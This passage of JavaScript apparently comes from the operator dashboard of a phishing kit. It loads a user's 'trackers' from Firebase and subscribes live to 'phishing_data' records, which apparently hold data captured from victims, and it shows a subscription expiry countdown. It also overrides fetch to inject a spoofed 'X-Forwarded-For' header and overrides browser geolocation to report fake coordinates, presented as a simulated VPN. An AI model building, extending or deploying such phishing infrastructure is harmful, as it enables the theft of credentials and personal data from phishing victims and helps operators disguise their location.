                document.getElementById('splashVideoOverlay').style.display = 'none';
                document.getElementById('loginCard').style.display = 'none';
                document.getElementById('dashboard').style.display = 'block';
                document.getElementById('accountUsername').textContent = saved;
                document.getElementById('displayUsername').innerHTML = saved + '<span>.</span>';
                
                const h = localStorage.getItem('phising_history');
                if(h) history = JSON.parse(h);
                
                db.ref(`users/${saved}/trackers`).once('value', s => {
                    trackers = s.val() || [];
                    trackers.forEach((t, i) => {
                        if(t.id) {
                            db.ref(`phishing_data/${t.id}`).on('value', ds => {
                                const nd = ds.val();
                                if(nd) {
                                    trackers[i].data = nd;
                                    renderTrackerList();
                                }
                            });
                        }
                    });
                    renderTrackerList();
                });
                
                setInterval(() => {
                    const exp = localStorage.getItem('user_expiry');
                    if(!exp) return;
                    const d = exp - new Date().getTime();
                    if(d < 0) {
                        logout();
                        return;
                    }
                    const h = Math.floor(d / 3600000);
                    const m = Math.floor((d % 3600000) / 60000);
                    const s = Math.floor((d % 60000) / 1000);
                    document.getElementById('expiryDisplay').textContent =
                        `${String(h).padStart(2, '0')}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
                }, 1000);
                
                updateWorldClock();
                setInterval(updateWorldClock, 1000);
                
                getRealIP();
                
                // CEK VPN REMINDER
                checkVPNOnLoad();
                
            } else {
                document.getElementById('splashVideoOverlay').style.display = 'none';
                document.getElementById('loginCard').style.display = 'block';
                document.getElementById('dashboard').style.display = 'none';
            }
        }).catch(() => {
            document.getElementById('splashVideoOverlay').style.display = 'none';
            document.getElementById('loginCard').style.display = 'block';
            document.getElementById('dashboard').style.display = 'none';
        });
    } else {
        document.getElementById('splashVideoOverlay').style.display = 'none';
        document.getElementById('loginCard').style.display = 'block';
        document.getElementById('dashboard').style.display = 'none';
    }
};

// INTERCEPT FETCH REQUESTS (SIMULASI PROXY)
const originalFetch = window.fetch;
window.fetch = function(url, options) {
    if (vpnConnected && vpnServer) {
        options = options || {};
        options.headers = {
            ...options.headers,
            'X-Proxy-Server': vpnServer,
            'X-Forwarded-For': '10.0.0.1'
        };
        console.log(`🌐 Request via VPN (${vpnServer}):`, url);
    }
    return originalFetch.call(this, url, options);
};

// INTERCEPT GEOLOCATION (SESUAIKAN LOKASI DENGAN SERVER VPN)
if (navigator.geolocation) {
    const originalGetCurrentPosition = navigator.geolocation.getCurrentPosition;
    navigator.geolocation.getCurrentPosition = function(success, error, options) {
        if (vpnConnected && vpnServer) {
            const fakeLocations = {
                'singapore': { lat: 1.3521, lon: 103.8198 },
                'japan': { lat: 35.6762, lon: 139.6503 },
                'usa': { lat: 40.7128, lon: -74.0060 },
                'uk': { lat: 51.5074, lon: -0.1278 },
                'germany': { lat: 52.5200, lon: 13.4050 },
                'netherlands': { lat: 52.3702, lon: 4.8952 }
            };
            const loc = fakeLocations[vpnServer] || fakeLocations.singapore;
            success({
                coords: {
                    latitude: loc.lat,
                    longitude: loc.lon,
                    accuracy: 10
                },
                timestamp: Date.now()
            });
        } else {
            originalGetCurrentPosition.call(this, success, error, options);
        }
    };
}